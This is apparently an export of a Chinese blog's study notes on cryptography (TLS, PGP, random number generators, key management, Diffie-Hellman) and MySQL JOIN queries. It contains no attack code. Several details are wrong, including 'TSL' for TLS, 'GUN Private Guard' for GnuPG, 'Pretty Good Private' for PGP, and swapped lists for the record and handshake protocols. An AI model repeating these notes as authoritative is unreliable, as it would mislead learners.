Finished（客户端→服务器）&lt;/font&gt;：客户端：握手协议到此结束。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑫ ChangeCipherSpec（客户端←服务器）&lt;/font&gt;：服务器：好，现在我要切换密码了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑬ Finished（客户端←服务器）&lt;/font&gt;：服务器：握手协议到此结束。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑭ 切换至应用数据协议&lt;/font&gt;：在此之后，客户端和服务器会使用应用数据协议和TSL记录协议进行密码通信。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上面的步骤可以看出，握手协议完成了如下的操作：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 客户端获得了服务器的合法公钥，完成了服务器的认证&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 服务器端获得了客户端的合法公钥，完成了客户端认证（当客户端需要认证时）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 客户端和服务器生成了密码通信中使用的共享密钥&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 客户端和服务器生成消息认证码中使用的共享密钥&nbsp;&nbsp;&nbsp;&nbsp;3-2.密码规格变更协议&lt;/font&gt;：用于密码切换的同步&nbsp;&nbsp;&nbsp;&nbsp;3-3.警告协议&lt;/font&gt;：发生错误时会使用该协议&nbsp;&nbsp;&nbsp;&nbsp;3-4.应用数据协议&lt;/font&gt;：用于和通信对象之间传送应用数据4.主密码&lt;/font&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主密码是一个48字节的数值，这个数值非常重要，因为 TSL 密码通信的机密性和数据的认证全部依靠这个数值。&nbsp;&nbsp;&nbsp;&nbsp;4-1.主密码的计算&lt;/font&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主密码是服务器和客户端根据下列信息计算出来的：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 预备主密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 客户端随机数：相当于防止攻击者实现计算出密钥的盐&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 服务器随机数：相当于防止攻击者实现计算出密钥的盐&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;密钥素材的依赖关系如下图：&nbsp;&nbsp;&nbsp;&nbsp;4-2.主密码的目的&lt;/font&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主密码用于生下列 6 种信息&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 对称密码的密钥（客户端→服务器）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 对称密码的密钥（客户端←服务器）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 消息认证码的密钥（客户端→服务器）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 消息认证码的密钥（客户端←服务器）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 对称密码的 CBC 模式所使用的初始化向量（客户端→服务器）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 对称密码的 CBC 模式所使用的初始化向量（客户端←服务器）4.TSL 协议中有关的技术总结&lt;/font&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ TLS 记录协议中使用的密码技术&lt;/font&gt;：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 公钥密码：加密预备主密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 单向散列函数：构成伪随机数生成器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 数字签名：验证服务器和客户端的证书&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 伪随机数生成器：生成预备主密码；根据主密钥生成密钥（RSA/Diffie-Hellman 密码参数）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ TLS 握手协议中使用的密码技术&lt;/font&gt;：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 对称密码（CBC模式）：确保片段的机密性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 消息认证码：确保片段的完整性并进行认证&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 认证加密（AEAD）**：确保片段的完整性和机密性并进行认证 三、对 SSL/TSL 的攻击 **1.对各个密码技术的攻击** **2.OpenSSL 的心脏出血漏洞** **3.SSL3.0 的漏洞与POODLE的攻击** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 对 CBC 模式加密时的分组填充操作没有进行严格的规定 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 要有效抵御POODLE的攻击，必须禁用 SSL3.0 **4.FREAK 攻击与密码产品出口管制** **5.对伪随机数生成器的攻击** **6.利用证书的时间差进行攻击** 四、SSL/TSL 用户的注意事项 **1.不要误解证书的含义** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里的认证只是确认了通信对象是经过认证机构确认的服务器，而并不能确认是否可以和该通信对象进行安全的在线购物交易。 **2.密码通信之前的数据是不受保护的** **3.密码通信之后的数据是不受保护的**]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第十三章（PGP）学习笔记]]></title>
    <url>%2F2019%2F05%2F29%2F2019.05.29%EF%BC%8864%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 学习的内容： PGP简介 生成密钥对 加密与解密 生成和验证数字签名 “生成数字签名并加密”和“解密并验证数字签名” 信任网 一、PGP简介 1.什么是PGP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PGP(Pretty Good Private)是一个密码软件，它将多种密码学的技术结合起来，形成的密码技术2.什么是OpenPGP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenPGP 是对密文和数字签名格式进行定义的标准规格，有 RFC1991、RFC2440、 RFC4880、RFC5581、RFC6637。 RFC4880：增加了对RSA、DSA的支持 RFC6637：增加了对椭圆曲线密码的支持，还增加了用于比较密码学强度的平衡性的对照表，如下图： 3.什么是GUN Private Guard&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GUN Private Guard 是一款基于OpenPGP 标准开发的密码学软件，支持 加密、数字签名、密钥管理、S/MIME、ssh等多项功能，并且是基于 GUNPG 协议发布的一款自由软件。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GUNPG分为stable、modern 和 classic 三个系列 GUNPG stable：版本号为2.0.x，支持OpenPGP、S/MIME 和 ssh GUNPG modern：版本号为2.1.x，在stable的基础上增加了对椭圆曲线密码的支持 GUNPG classic：版本号为1.4.x，是较旧的版本 4.PGP的功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 对称密码：AES、IDEA、CAST、三重DES、Blowfish、Twofish、Camellia等&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 公钥密码：RSA 和 ElGamal等&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 数字签名：可以使用数字签名的算法有 RSA、DSA、ECDSA（椭圆曲线DSA）、EdDSA（爱德华兹DSA）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 单向散列函数：SHA-1、SHA-224、SHA-256、SHA-384、SHA-512 和 RIPEMD-160、MD5（不推荐使用）等&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 证书：可以生成 OpenGPG 中规定的证书，以及与 X.509 规范兼容的证书；还可以颁发公钥作废证明，也可以使用 CRL 和 OSCP 对证书进行检验&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 压缩：支持对数据的压缩（ZIP、ZLIB、BZIPZ）和解压缩&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 文本数据：可以将二进制与文本数据（ASCII radix-64格式）进行转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 大文件的拆分和拼合&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 钥匙串管理：用于管理密钥的文件称为钥匙串 二、生成密钥对 PGP 生成密钥对的代码行为：1gpg2 --full-gen-key 三、加密与解密 1.加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 生成和加密会话密钥&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 压缩和加密消息2.解密 四、生成和验证数字签名 1.生成数字签名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 解密私钥&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 生成数字签名2.验证数字签名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 恢复发送者发送的散列值&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 对比散列值 五、生成数字签名并加密以及解密并验证数字签名 1.生成数字签名并加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 生成数字签名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 加密2.解密并验证数字签名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 验证数字签名 六、信任网 **1.公钥合法性** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于确认公钥的合法性，我们前面就学习了“证书”相关技术，证书就是认证机构对公钥施加的数字签名，通过验证这个数字签名就可以确认公钥的合法性，而在PGP技术里，不需要通过认证机构来确认公钥的合法性，而是通过一种叫做“**信任网**”的方法，**PGP用户会互相对对方的公钥进行签名** **2.场景1：通过自己的数字签名进行确认** **3.场景2：通过自己完全信任的人的数字签名进行确认** **4.场景3：通过自己有限信任的多个人的数字签名进行确认** **5.公钥合法性与所有者信任是不同的** **6.所有者信任级别因人而异的**]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第十二章（随机数）学习笔记]]></title>
    <url>%2F2019%2F05%2F28%2F2019.05.28%EF%BC%8863%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 学习的内容： 使用随机数的密码技术 随机数的性质 伪随机数生成器 具体的伪随机数生成器 对伪随机数生成器的攻击 一、使用随机数的密码技术 1.随机数的作用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 生成密钥：对称密码和消息认证码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 生成密钥对：公钥密码和数字签名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 生成初始化向量：分组密码的CBC、CFB 和 OFB 模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 生成 nonce：用于防御重放攻击以及分组密码的 CTR 模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 生成盐：用于基于口令的密码（PBE）2.随机数的性质&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 随机性（弱伪随机数）：不存在统计学偏差&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 不可预测性（强伪随机数）：不能从以往的数列推测出写一个出现的数，不可预测性是通过其他密码技术实现的&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 不可重现性（真伪随机数）：不能出现相同的数列，目前最常用的就是热噪声自然现象▍说明：这里详细的来介绍一下上者的三层关系：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▪ 具有随机性性质的数列不一定具有不可预测性，但是具有不可预测性一定具有随机性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▪ 具有不可预测性的数列不一定具有不可重现性，但是具有不可重现性一定具有不可预测性和随机性也就是说在密码学重的随机数必须要具备不可重现性，才可以保证安全，有关这三者的区别具体看下图： 二、伪随机数生成器 1.伪随机数生成器的概念&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于生成伪随机数的软件称为“伪随机数生成器”，之所以是“伪”随机数生成器，是因为真随机数的生成仅靠软件是无法进行的2.伪随机数生成器的结构&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 内部状态：是指伪随机数生成器所管理的内存中的数值；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 种子：伪随机数的种子是用来对伪随机数生成器的内部状态进行初始化的，它是一串随机的比特序列，可以通过伪随机数生成器生成。 三、具体的伪随机数生成器 1.杂乱的方法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不适用2.线性同余法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线性同余法是一种被广泛使用的伪随机数生成器算法，但是不能被用于密码算法，它的计算公式为： Ri = ( A × Ri-1 + C ) mod M &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ Ri、Ri-1：伪随机数，也被称为内部状态，其中 Ri 是由 Ri-1 通过上述公式得到的&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 攻击者要想攻击线性同余法，其实没有必要知道A、C 和 M，因为根据线性同余发生成的数列就可以反算出 A、C 和 M。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 线性同余法不具备“不可预测性”&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 线性同余法实现的程序代码： 123456789M = N*；A = (0，M)∈ Z;C = (0，M)∈ Z;Ri(Internal state) = Seed of pseudo random number；while(Ture)&#123; PRN = (A × Ri + C) mod M； IS = PRN； print(PRN);&#125; 3.单向散列函数法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;单向散列函数的单向性是支撑伪随机数生成器不可预测性的基础1234567## 计数器的初始值相当于种子，counter的值相当于内部状态；counter = 计数器初始值；while(ture)&#123; 伪随机数 = 用单向散列函数求 counter 的散列值值； 输出伪随机数； counter += 1; &#125; 4.密码法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 使用密码法来编写生成伪随机数的伪随机数的生产器，可以使用 AES 等对称密码，也可以使用 RSA 等公钥密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 密码的机密性是支撑伪随机数生成器不可预测性的基础&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 其代码实现如下：123456789# key的值和随机数初始值的组合相当于为随机数的种子# 计数器相当于内部状态key = 密码的密钥;counter = 计数器的初始值;while(ture)&#123; 伪随机数 = 用key加密的counter； 输出伪随机数； counter += 1；&#125; 5.ANSI X9.17&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ ANSI X9.17 和 X9.31中使用了三重 DES 和 AES 作为密码算法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ (3) - (5) 的作用是输出伪随机数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ (6) - (8) 的作用是更新内部状态&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 实现程序的代码为：123456789# key的值与内部状态初始值的组合相当于伪随机数的种子key = 加密密钥；内部状态 = 内部状态初始值；while(ture)&#123; 掩码 = 用key加密当前的时间； 伪随机数 = 用key加密的“内部状态⊕掩码”； 输出伪随机数； 内部状态 = 用key加密的“伪随机数⊕掩码” &#125; 5.其他算法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原则：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个随机数算法再优秀，如果他不具备不可预测性，那么就不能被用于密码学和安全相关用途。 四、对伪随机数生成器的攻击 **1.对种子进行攻击** **2.对随机数池进行攻击** 五、学习感悟 通过这几周的学习，自我感觉状态还是不好，在接下来的学习中我必须必须要赶紧调整过来，争取找到一个最佳的学习状态，一步一步的来，把每件事都做好。]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL学习笔记（二）查询(2)]]></title>
    <url>%2F2019%2F05%2F25%2F2019.05.25%EF%BC%8862%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、多表查询 SELECT查询不但可以从一张表查询数据，还可以从多张表同时查询数据。查询多张表的语法是： SELECT * FROM 例如：SELECT * FROM students, classes 这种一次查询两个表的数据，查询的结果也是一个二维表，它是students表和classes表的“乘积”，即students表的每一行与classes表的每一行都两两拼在一起返回。结果集的列数是students表和classes表的列数之和，行数是students表和classes表的行数之积。这种多表查询又称笛卡尔查询，使用笛卡尔查询时要非常小心，由于结果集是目标表的行数乘积，对两个各自有100行记录的表进行笛卡尔查询将返回1万条记录，对两个各自有1万行记录的表进行笛卡尔查询将返回1亿条记录.你可能还注意到了，上述查询的结果集有两列id和两列name，两列id是因为其中一列是students表的id，而另一列是classes表的id，但是在结果集中，不好区分。两列name同理要解决这个问题，我们仍然可以利用投影查询的“设置列的别名”来给两个表各自的id和name列起别名：12345678SELECT students.id sid, students.name, students.gender, students.score, classes.id cid, classes.name cnameFROM students, classes; 注意，多表查询时，要使用表名.列名这样的方式来引用列和设置别名，这样就避免了结果集的列名重复问题。但是，用表名.列名这种方式列举两个表的所有列实在是很麻烦，所以SQL还允许给表设置一个别名，让我们在投影查询中引用起来稍微简洁一点：12345678SELECT s.id sid, s.name, s.gender, s.score, c.id cid, c.name cnameFROM students s, classes c; 注意到FROM子句给表设置别名的语法是FROM &lt;表名1&gt; &lt;别名1&gt;, &lt;表名2&gt; &lt;别名2&gt;。这样我们用别名s和c分别表示students表和classes表。多表查询也是可以添加WHERE条件的:123456789SELECT s.id sid, s.name, s.gender, s.score, c.id cid, c.name cnameFROM students s, classes cWHERE s.gender = &apos;M&apos; AND c.id = 1; 二、连接查询 连接查询是另一种类型的多表查询。连接查询对多个表进行JOIN运算，简单地说，就是先确定一个主表作为结果集，然后，把其他表的行有选择性地“连接”在主表结果集上。例如，我们想要选出students表的所有学生信息，可以用一条简单的SELECT语句完成： Select s.id,s.name,s.class_id,s.gender,s.score from students s;但是，假设我们希望结果集同时包含所在班级的名称，上面的结果集只有class_id列，缺少对应班级的name列。现在问题来了，存放班级名称的name列存储在classes表中，只有根据students表的class_id，找到classes表对应的行，再取出name列，就可以获得班级名称。这时，连接查询就派上了用场。我们先使用最常用的一种内连接——INNER JOIN来实现： Select s.id,s.name,s.class_id,s.gender,s.score from students s inner join classes c on s.class_id = c.id 注意INNER JOIN查询的写法是： 先确定主表，仍然使用FROM &lt;表1&gt;的语法； 再确定需要连接的表，使用INNER JOIN &lt;表2&gt;的语法； 然后确定连接条件，使用ON &lt;条件…&gt;，这里的条件是s.class_id = c.id，表示students表的class_id列与classes表的id列相同的行需要连接； 可选：加上WHERE子句、ORDER BY等子句。 使用别名不是必须的，但可以更好地简化查询语句。 那什么是内连接（INNER JOIN）呢？先别着急，有内连接（INNER JOIN）就有外连接（OUTER JOIN）。我们把内连接查询改成外连接查询，看看效果：1234SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.scoreFROM students sRIGHT OUTER JOIN classes cON s.class_id = c.id; 执行上述RIGHT OUTER JOIN可以看到，和INNER JOIN相比，RIGHT OUTER JOIN多了一行，多出来的一行是“四班”，但是，学生相关的列如name、gender、score都为NULL。这也容易理解，因为根据ON条件s.class_id = c.id，classes表的id=4的行正是“四班”，但是，students表中并不存在class_id=4的行。有RIGHT OUTER JOIN，就有LEFT OUTER JOIN，以及FULL OUTER JOIN。它们的区别是： NNER JOIN只返回同时存在于两张表的行数据，由于students表的class_id包含1，2，3，classes表的id包含1，2，3，4，所以INNER JOIN根据条件s.class_id = c.id返回的结果集仅包含1，2，3。RIGHT OUTER JOIN返回右表都存在的行。如果某一行仅在右表存在，那么结果集就会以NULL填充剩下的字段。LEFT OUTER JOIN则返回左表都存在的行。如果我们给students表增加一行，并添加class_id=5，由于classes表并不存在id=5的行，所以，LEFT OUTER JOIN的结果会增加一行，对应的class_name是NULL：1234SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.scoreFROM students sLEFT OUTER JOIN classes cON s.class_id = c.id; 三、本节小结 使用多表查询可以获取M x N行记录； 多表查询的结果集可能非常巨大，要小心使用； JOIN查询需要先确定主表，然后把另一个表的数据“附加”到结果集上； INNER JOIN是最常用的一种JOIN查询，它的语法是SELECT ... FROM &lt;表1&gt; INNER JOIN &lt;表2&gt; ON &lt;条件...&gt;； JOIN查询仍然可以使用WHERE条件和ORDER BY排序]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第十一章学习笔记]]></title>
    <url>%2F2019%2F05%2F23%2F2019.05.23%EF%BC%8861%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、什么是密钥？ 1.密钥中的数字并不重要，重要的是密钥空间的大小，也就是可能出现密钥的总数量，因为密钥空间越大，进行暴力破解越困难，密钥空间的大小是由密钥长度决定的； 对称DES的密钥长度：56bit 三重DES的密钥长度：① DES-EDE2：112bit ② DES-EDE3：168bit 对称AES的密钥长度：128、192 和 256bit 2.密钥和明文是等价的 3.密钥算法和密钥：依靠隐藏密码算法本身的设计来确保信息的机密性是非常危险的！！（重要）信息的机密性不应该依赖于密码算法本身，而是依赖于妥善保管的密钥。 二、各种不同的密钥 ◉ 对称密码的密钥：确保机密性的密钥◉ 公钥密码中密钥：确保机密性的密钥◉ 消息认证码中的密钥：用于认证的密钥，共享的密钥◉ 数字签名中的密钥：用于认证的密钥，公钥密码◪ 会话密钥：通信中只使用一次的密钥◪ 主密钥：通信中一直被重复使用的密钥◮ 用于加密内容的密钥（CEK）：加密对象是用户直接使用的信息◮ 用于加密密钥的密钥（KEK）：加密对象是密钥 三、密钥的管理 1.生成密钥：■■■ 用随机数生成密钥&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里的伪随机数生成器必须是专门针对密码学用途而设计的■■■ 用口令生成密钥&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将口令输入单向散列函数，然后将散列值作为密钥使用。为了防止字典攻击，需要在口令上面附加一串成为盐（salt）的随机数，然后再将其输入单向散列函数，这种方法称为“基于口令的密码（PBE）”2.配送密钥： 事先共享密钥 使用密钥分配中心 使用公钥密码 Diffie-Hellman 密钥交换 3.更新密钥：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在使用共享密钥进行通信的过程中，定期改变密钥。在改变密钥时，发送者和接收者使用单向散列函数计算当前密钥的散列值，并将这个散列值用作新的密钥。也就是，用当前密钥的散列值作为下一个密钥。4.保存密钥5.作废密钥■■■ 如何作废密钥？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要完全删除密钥，不但要用到密码软件，还需要设计计算机系统时对信息安全进行充分的考虑。 四、Diffie-Hellman 密钥交换 **1.什么是 Diffie-Hellman 密钥交换：** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通信双方仅通过交换一些可以公开地信息就能够生成出共享的秘密数字，而这一秘密数字就可以被用作堆成密码的密钥。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一定要清楚的是，虽然叫做“密钥交换”，但是通信双方并没有真正的交换密钥，而是通过计算生成出了一个相同的共享密钥（**利用 mod 算法的困难**） **2.Diffie-Hellman 密钥交换的步骤：** ![](http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/dRxFXwqikYSqkPJaxd0fvu429SqwCTyJgNukJqC945I!/r/dFMBAAAAAAAA) （一）Alice向Bob发送两个质数 P 和 G（生成元） （二）Alice生成一个随机数 A （三）Bob生成一个随机数B （四）Alice 将GA mod P 的结果发送给 Bob （五）Bob 将GB mod P 的结果发送给 Alice （六）Alice 用Bob发送过来的数计算 A 次方并求 P ： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（GB mod P ）A mod P &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= GB x A mod P &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= GA x B mod P （七）Bob 用Alice 发送过来的数计算 B 次方并求 P &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（GA mod P ）B mod P &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= GA x B mod P **实质就是运用了 mod 的运算法则和逆运算的困难度** **3.Diffie-Hellman 的密钥能被窃听者计算出来吗？** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先我们来分析 Alice 和 Bob 都传输了哪些数据：**P、G、GA mod P 和 GB mod P** 四个数据，如果 Eve 要想计算出 Diffie-Hellman 的密钥，就必须知道 A、B 这两个数据（如果知道 A 和 B 其中一个就可以计算出 DAxB，也就可以解出密钥了）。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么**解出密钥的关键在于 mod P，**因为根据 GA mod P 计算出 A 的有效算法还没有出现，这个问题称为**有限域的离散对数问题** **而有限域的离散对数问题的复杂度正是支撑 Diffie-Hellman 密钥交换算法的基础。** **4.生成元的意义** ![](http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/GLM*QK*coca0S6twK.I5ZbR6XyqnsnpXsxda7CcPHQs!/r/dFMBAAAAAAAA) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上图可以看出，G = 2、6、7 和 11 时，GA mod P 所得的值均不相同，所以 2、6、7、11 称为 13 的生成元，需要注意的地方：**GP-1 mod P 一定等于 “1”** **5.主动攻击者能否对 Diffie-Hellman 进行中间人攻击呢？** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当然是可以的，具体的我会在后期画出一个示意图，然后再进行补充。 **6.椭圆曲线 Diffie-Hellman 密钥交换** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Diffie-Hellman 密钥交换是利用“离散对数问题”的复杂度来实现密钥的安全交换的，而椭圆曲线 Diffie-Hellman 密钥交换是将 **“离散对数问题”** 改为 